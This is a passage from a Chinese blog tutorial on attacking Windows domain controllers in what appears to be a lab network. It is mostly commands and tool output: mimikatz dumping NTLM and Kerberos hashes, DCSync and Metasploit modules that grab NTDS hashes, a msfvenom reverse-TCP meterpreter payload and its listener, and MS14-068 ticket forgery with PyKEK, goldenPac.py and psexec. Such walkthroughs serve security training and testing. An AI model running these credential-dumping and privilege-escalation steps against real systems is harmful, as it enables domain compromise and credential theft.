8:00:00</span><br><span class="line">Password last change : 2021/7/10 12:13:11</span><br><span class="line">Object Security ID   : S-1-5-21-3725759035-2690766561-1621034971-500</span><br><span class="line">Object Relative ID   : 500</span><br><span class="line"></span><br><span class="line">Credentials:</span><br><span class="line">  Hash NTLM: ae0597dc61a5c66b3a0600c60044c448</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:NTLM-Strong-NTOWF *</span><br><span class="line">    Random Value : be5d62e6cc92a91eeb4398c6901f1af9</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos-Newer-Keys *</span><br><span class="line">    Default Salt : WIN-KR84V9JAQCRAdministrator</span><br><span class="line">    Default Iterations : 4096</span><br><span class="line">    Credentials</span><br><span class="line">      aes256_hmac       (4096) : cbf0b71442bd21aabc273f12a74291863ea7d08c01d8047a2c0f77ae7cde67cc</span><br><span class="line">      aes128_hmac       (4096) : 9f70a9c7a7cda474382258797785735c</span><br><span class="line">      des_cbc_md5       (4096) : fb2fd562effd3bf4</span><br><span class="line"></span><br><span class="line">* Packages *</span><br><span class="line">    NTLM-Strong-NTOWF</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos *</span><br><span class="line">    Default Salt : WIN-KR84V9JAQCRAdministrator</span><br><span class="line">    Credentials</span><br><span class="line">      des_cbc_md5       : fb2fd562effd3bf4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mimikatz #</span><br></pre></td></tr></table></figure><p><code>转储lsass.exe进程对散列值进行Dump</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">privilege::debuglsadump::lsa /inject</span><br></pre></td></tr></table></figure><h3 id="2-Invoke-DCSync-ps1脚本"><a href="#2-Invoke-DCSync-ps1脚本" class="headerlink" title="2.Invoke-DCSync.ps1脚本"></a>2.Invoke-DCSync.ps1脚本</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Invoke-DCSync.ps1Invoke-DCSync -PWDumpFormat</span><br></pre></td></tr></table></figure><h2 id="0x04-使用msf获取散列值"><a href="#0x04-使用msf获取散列值" class="headerlink" title="0x04.使用msf获取散列值"></a>0x04.使用msf获取散列值</h2><h3 id="1-psexec-ntdsgrab模块"><a href="#1-psexec-ntdsgrab模块" class="headerlink" title="1.psexec_ntdsgrab模块"></a>1.psexec_ntdsgrab模块</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">msf6 auxiliary(admin/smb/psexec_ntdsgrab) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (auxiliary/admin/smb/psexec_ntdsgrab):</span><br><span class="line"></span><br><span class="line">   Name                  Current Setting  Required  Description</span><br><span class="line">   ----                  ---------------  --------  -----------</span><br><span class="line">   CREATE_NEW_VSC        false            no        If true, attempts to create a volume shadow copy</span><br><span class="line">   RHOSTS                10.10.10.10      yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;pa</span><br><span class="line">                                                    th&gt;&#x27;</span><br><span class="line">   RPORT                 445              yes       The SMB service port (TCP)</span><br><span class="line">   SERVICE_DESCRIPTION                    no        Service description to to be used on target for pretty listing</span><br><span class="line">   SERVICE_DISPLAY_NAME                   no        The service display name</span><br><span class="line">   SERVICE_NAME                           no        The service name</span><br><span class="line">   SMBDomain             jiye.net         no        The Windows domain to use for authentication</span><br><span class="line">   SMBPass               11               no        The password for the specified username</span><br><span class="line">   SMBSHARE              C$               yes       The name of a writeable share on the server</span><br><span class="line">   SMBUser               administrator    no        The username to authenticate as</span><br><span class="line">   VSCPATH                                no        The path to the target Volume Shadow Copy</span><br><span class="line">   WINPATH               WINDOWS          yes       The name of the Windows directory (examples: WINDOWS, WINNT)</span><br><span class="line"></span><br><span class="line">msf6 auxiliary(admin/smb/psexec_ntdsgrab) &gt; </span><br></pre></td></tr></table></figure><h3 id="2-meterpreter会话获取域账号和域散列值"><a href="#2-meterpreter会话获取域账号和域散列值" class="headerlink" title="2.meterpreter会话获取域账号和域散列值"></a>2.meterpreter会话获取域账号和域散列值</h3><p><code>生成payload</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.130 LPORT=6666 -f exe &gt; s.exe</span><br></pre></td></tr></table></figure><p><code>监听反弹shell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/handler):</span><br><span class="line"></span><br><span class="line">   Name  Current Setting  Required  Description</span><br><span class="line">   ----  ---------------  --------  -----------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     10.10.10.130     yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     6666             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Wildcard Target</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.10.130:6666 </span><br><span class="line">[*] Sending stage (175174 bytes) to 10.10.10.10</span><br><span class="line">[*] Meterpreter session 9 opened (10.10.10.130:6666 -&gt; 10.10.10.10:51782) at 2021-09-05 08:01:33 -0400</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure><p><code>使用domain_hashdump，但是这里并没有利用成功（提示需要64位payload）</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">msf6 post(windows/gather/credentials/domain_hashdump) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (post/windows/gather/credentials/domain_hashdump):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   CLEANUP  true             yes       Automatically delete ntds backup created</span><br><span class="line">   RHOST    localhost        yes       Target address range</span><br><span class="line">   SESSION  1                yes       The session to run this module on.</span><br><span class="line">   TIMEOUT  60               yes       Timeout for WMI command in seconds</span><br><span class="line"></span><br><span class="line">msf6 post(windows/gather/credentials/domain_hashdump) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Session has Admin privs</span><br><span class="line">[*] Session is on a Domain Controller</span><br><span class="line">[-] You are running 32-bit Meterpreter on a 64 bit system</span><br><span class="line">[-] Try migrating to a 64-bit process and try again</span><br><span class="line">[*] Post module execution completed</span><br><span class="line">msf6 post(windows/gather/credentials/domain_hashdump) &gt; </span><br></pre></td></tr></table></figure><h2 id="0x05-vshadow-exe和QuarksPwDump-exe导出域账号和散列值"><a href="#0x05-vshadow-exe和QuarksPwDump-exe导出域账号和散列值" class="headerlink" title="0x05.vshadow.exe和QuarksPwDump.exe导出域账号和散列值"></a>0x05.vshadow.exe和QuarksPwDump.exe导出域账号和散列值</h2><h2 id="0x06-Kerberos域用户提权漏洞分析"><a href="#0x06-Kerberos域用户提权漏洞分析" class="headerlink" title="0x06.Kerberos域用户提权漏洞分析"></a>0x06.Kerberos域用户提权漏洞分析</h2><h3 id="1-PyKEK工具包"><a href="#1-PyKEK工具包" class="headerlink" title="1.PyKEK工具包"></a>1.PyKEK工具包</h3><p><code>查看补丁安装情况</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic qfe get hotfixid</span><br></pre></td></tr></table></figure><p><code>查看用户SID</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">whoami /user</span><br><span class="line">wmic useraccount get name,sid</span><br></pre></td></tr></table></figure><p><code>使用其中的MS14-068.exe生成高权限票据</code></p><blockquote><p>-u<username>@<domainname>:用户名@域名。<br>-s<usersid>: 用户SID。<br>-d<domaincontroleraddr>:域控制器地址。<br>-p<clearpassword>: 明文密码。<br>–rc4<ntlmhash>:在没有明文密码的情况下，通过NTLM Hash登录。</ntlmhash></clearpassword></domaincontroleraddr></usersid></domainname></username></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ms14-068.exe -u 域成员名@域名 -s 域成员sid -d 域控制器地址 -p域成员密码</span><br><span class="line"> </span><br><span class="line">pytho脚本n案例：python ms14-068.py -u administrator@jiye.net -s S-1-5-21-3725759035-2690766561-1621034971-500 -d 10.10.10.10 -p 11</span><br><span class="line">exe案例：ms14-068.exe -u win7dc1@jiye.net -s S-1-5-21-3725759035-2690766561-1621034971-1120 -d 10.10.10.10 -p passwd</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">──(root💀kali)-[~/Downloads/pykek-master]</span><br><span class="line">└─# python ms14-068.py -u win7dc1@jiye.net -s S-1-5-21-3725759035-2690766561-1621034971-1120 -d 10.10.10.10 -p passwd        1 ⨯</span><br><span class="line">  [+] Building AS-REQ for 10.10.10.10... Done!</span><br><span class="line">  [+] Sending AS-REQ to 10.10.10.10... Done!</span><br><span class="line">  [+] Receiving AS-REP from 10.10.10.10... Done!</span><br><span class="line">  [+] Parsing AS-REP from 10.10.10.10... Done!</span><br><span class="line">  [+] Building TGS-REQ for 10.10.10.10... Done!</span><br><span class="line">  [+] Sending TGS-REQ to 10.10.10.10... Done!</span><br><span class="line">  [+] Receiving TGS-REP from 10.10.10.10... Done!</span><br><span class="line">  [+] Parsing TGS-REP from 10.10.10.10... Done!</span><br><span class="line">  [+] Creating ccache file &#x27;TGT_win7dc1@jiye.net.ccache&#x27;... Done!</span><br><span class="line">                                                                                                                                    </span><br><span class="line">┌──(root💀kali)-[~/Downloads/pykek-master]</span><br></pre></td></tr></table></figure><p><code>导出票据到mimikatz目录下并清除票据</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge</span><br></pre></td></tr></table></figure><p><code>注入票据</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptc &quot;TGT_win7dc1@jiye.net.ccache&quot;</span><br></pre></td></tr></table></figure><p><code>列出目录</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\dc\c$</span><br></pre></td></tr></table></figure><h3 id="2-goldenPac-py"><a href="#2-goldenPac-py" class="headerlink" title="2.goldenPac.py"></a>2.goldenPac.py</h3><p><code>安装Kerberos客户端</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install krb5-user -y</span><br></pre></td></tr></table></figure><p><code>利用</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 goldenPac.py jiye.net/Administrator:11@10.10.10.10</span><br></pre></td></tr></table></figure><h3 id="3-msf模块利用"><a href="#3-msf模块利用" class="headerlink" title="3.msf模块利用"></a>3.msf模块利用</h3><p><code>生成票据</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/admin/kerberos/ms14_068_kerberos_checksum</span><br></pre></td></tr></table></figure><p><code>msf不支持bin文件，所以转换票据</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::clist &quot;.......bin&quot; /export</span><br></pre></td></tr></table></figure><p><code>之后反弹meterpreter shell</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load kiwi 票据</span><br></pre></td></tr></table></figure><p><code>利用</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/windows/local/current_user_psexec </span><br><span class="line">[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/local/current_user_psexec) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/local/current_user_psexec) &gt; set TECHNIQUE PSH</span><br><span class="line">TECHNIQUE =&gt; PSH</span><br><span class="line">msf6 exploit(windows/local/current_user_psexec) &gt; set RHOSTS jiye.net</span><br><span class="line">RHOSTS =&gt; win2008.hello.com</span><br><span class="line">msf6 exploit(windows/local/current_user_psexec) &gt; set lhost 10.10.10.130</span><br><span class="line">lhost =&gt; 1.1.1.5</span><br><span class="line">msf6 exploit(windows/local/current_user_psexec) &gt; set session 1</span><br><span class="line">session =&gt; 1</span><br><span class="line">msf6 exploit(windows/local/current_user_psexec) &gt; run</span><br></pre></td></tr></table></figure></div><div><div><div style="text-align:center;color:#000;font-size:20px">-------------纸短情长<i class="fa fa-paw"></i>下次再见-------------</div></div></div><div class="reward-container"><div>加个赞赏，万一有好心人呢~</div><button onclick='document.querySelector(".post-reward").classList.toggle("active")'>谢谢你请我吃辣条!</button><div class="post-reward"><div><img src="/images/wechatpay.jpg" alt="Lluna 微信"> <span>微信</span></div><div><img src="/images/alipay.jpg" alt="Lluna 支付宝"> <span>支付宝</span></div></div></div><div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者： </strong>Lluna</li><li class="post-copyright-link"><strong>本文链接：</strong> <a href="https://lunamoore.github.io/2021/09/06/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%AE%89%E5%85%A8/" title="内网渗透测试-域控制器安全">https://lunamoore.github.io/2021/09/06/内网渗透测试-域控制器安全/</a></li><li class="post-copyright-license"><strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC8="><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> 许可协议。转载请标注链接及作者！</li></ul></div><div class="followme"><span>欢迎关注我的公众号</span><div class="social-list"><div class="social-item"><a target="_blank" class="social-link" href="/images/gzh.jpg"><span class="icon"><i class="fab fa-weixin"></i> </span><span class="label">WeChat</span></a></div></div></div><footer class="post-footer"><div class="post-tags"><a href="/tags/windows/" rel="tag"><i class="fa fa-tag"></i> windows</a> <a href="/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" rel="tag"><i class="fa fa-tag"></i> 内网安全</a></div><div class="post-nav"><div class="post-nav-item"><a href="/2021/08/16/HTB-Previse/" rel="prev" title="HTB-Previse"><i class="fa fa-chevron-left"></i> HTB-Previse</a></div><div class="post-nav-item"><a href="/2021/09/19/MoriatyCorp/" rel="next" title="MoriatyCorp">MoriatyCorp <i class="fa fa-chevron-right"></i></a></div></div></footer></article><div class="comments" id="valine-comments"></div><script>window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      const commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }</script></div></main><footer class="footer"><div class="footer-inner"><div class="copyright">&copy; 2020 – <span itemprop="copyrightYear">2022</span> <span class="with-love"><i class="fa fa-heart"></i> </span><span class="author" itemprop="copyrightHolder">Lluna</span></div><div class="wordcount"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="fa fa-chart-line"></i> </span><span>站点总字数：</span> <span title="站点总字数">709k</span> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="fa fa-coffee"></i> </span><span>站点阅读时长 &asymp;</span> <span title="站点阅读时长">10:44</span></span></div><span id="sitetime"></span><script language="javascript">function siteTime(){window.setTimeout("siteTime()",1e3);var e=36e5,t=24*e,o=new Date,i=o.getFullYear(),a=o.getMonth()+1,n=o.getDate(),r=o.getHours(),l=o.getMinutes(),s=o.getSeconds(),M=Date.UTC(2020,8,14,15,0,0),g=Date.UTC(i,a,n,r,l,s)-M,m=Math.floor(g/31536e6),T=Math.floor(g/t-365*m),f=Math.floor((g-(365*m+T)*t)/e),h=Math.floor((g-(365*m+T)*t-f*e)/6e4),u=Math.floor((g-(365*m+T)*t-f*e-6e4*h)/1e3);document.getElementById("sitetime").innerHTML="小站已运行"+m+" 年 "+T+" 天 "+f+" 小时 "+h+" 分钟 "+u+" 秒"}siteTime()</script><div class="busuanzi-count"><span class="post-meta-item" id="busuanzi_container_site_uv" style="display:none"><span class="post-meta-item-icon"><i class="fa fa-user"></i> </span><span class="site-uv" title="总访客量"><span id="busuanzi_value_site_uv"></span> </span></span><span class="post-meta-item" id="busuanzi_container_site_pv" style="display:none"><span class="post-meta-item-icon"><i class="fa fa-eye"></i> </span><span class="site-pv" title="总访问量"><span id="busuanzi_value_site_pv"></span></span></span></div><script color="0,0,0" opacity="0.7" zindex="-1" count="300" src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js"></script></div></footer><script src="//cdn.jsdelivr.net/npm/animejs@3.2.0/lib/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script><script src="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script>!function(){var t=document.createElement("script"),e=window.location.protocol.split(":")[0];t.src="https"===e?"https://zz.bdstatic.com/linksubmit/push.js":"http://push.zhanzhang.baidu.com/push.js";var s=document.getElementsByTagName("script")[0];s.parentNode.insertBefore(t,s)}()</script><script src="/js/local-search.js"></script><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script>NexT.utils.loadComments('#valine-comments', () => {
  NexT.utils.getScript('//cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
    new Valine(Object.assign({
      el  : '#valine-comments',
      path: location.pathname,
    }, {"enable":true,"appId":"8hPlmJu758GqGb8p9gI7IWIH-gzGzoHsz","appKey":"EBvPjdspqOEm800591erwHwx","placeholder":"ヾﾉ≧∀≦)o来了老弟!","avatar":"wavatar","meta":["nick","mail","link"],"pageSize":10,"lang":null,"visitor":true,"comment_count":true,"recordIP":false,"serverURLs":null,"enableQQ":false,"requiredFields":[]}
    ));
  }, window.Valine);
});</script><script type="text/javascript" src="/js/love.js"></script></body></html>